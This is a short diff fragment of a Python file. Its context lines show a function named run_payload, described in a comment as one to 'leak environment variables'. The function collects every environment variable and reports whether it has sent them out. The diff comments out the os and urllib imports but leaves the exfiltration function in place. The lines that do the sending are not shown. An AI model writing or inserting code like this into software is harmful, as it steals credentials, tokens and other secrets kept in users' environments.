@@ -1,8 +1,8 @@
-import os
-import urllib.request
-import urllib.parse
-
+# import os
+# import urllib.request
+# import urllib.parse
 # Function to leak environment variables
+
 def run_payload():
     # Collect environment variables
     data = dict(os.environ)
@@ -21,4 +21,3 @@ def run_payload():
         print("Successfully sent environment variables")
     except Exception as e:
         print(f"Failed to send environment variables: {e}")
-
